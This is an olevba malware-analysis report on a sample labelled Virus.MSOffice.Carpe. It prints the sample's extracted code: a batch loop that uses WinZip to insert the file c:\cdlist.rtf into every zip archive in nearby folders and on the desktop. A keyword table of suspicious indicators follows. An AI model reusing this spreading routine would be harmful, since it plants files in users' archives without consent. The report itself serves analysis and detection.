olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Carpe-e1e9d9764aeeebbd67b2e2c00530eaab15015e2a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Carpe-e1e9d9764aeeebbd67b2e2c00530eaab15015e2a 
in file: Virus.MSOffice.Carpe-e1e9d9764aeeebbd67b2e2c00530eaab15015e2a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set wz="c:\Program Files\WinZip\WinZip32.exe"
for %%a in (*.zip ..\*.zip Windows\Desktop\*.zip) do %wz% -a -r -p %%a c:\cdlist.rtf
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |WinZip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

